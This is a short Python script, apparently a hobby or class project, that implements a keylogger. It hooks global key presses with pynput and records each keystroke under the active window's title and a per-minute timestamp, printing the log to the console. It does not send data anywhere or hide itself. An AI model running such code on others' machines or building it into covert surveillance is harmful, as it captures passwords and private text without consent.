from datetime import datetime
from pynput.keyboard import Listener
import pygetwindow as gw

class KeyLoggerService:
    def __init__(self):
        self.dict = {}

    def on_press(self, key):
        if self._get_window() not in self.dict:
            self.dict[self._get_window()] = {self._get_time(): str(key)}
        else:
            if self._get_time() not in self.dict[self._get_window()]:
                self.dict[self._get_window()][self._get_time()] = str(key)
            else:
                self.dict[self._get_window()][self._get_time()] += str(key)
        print(self.dict)

    def _get_window(self):
        return gw.getActiveWindow().title

    def _get_time(self):
        return datetime.now().strftime("%y/%m/%d %H:%M")

KeyLoggerService = KeyLoggerService()
with Listener(on_press=KeyLoggerService.on_press) as listener:
    listener.join()

# know im in haims branch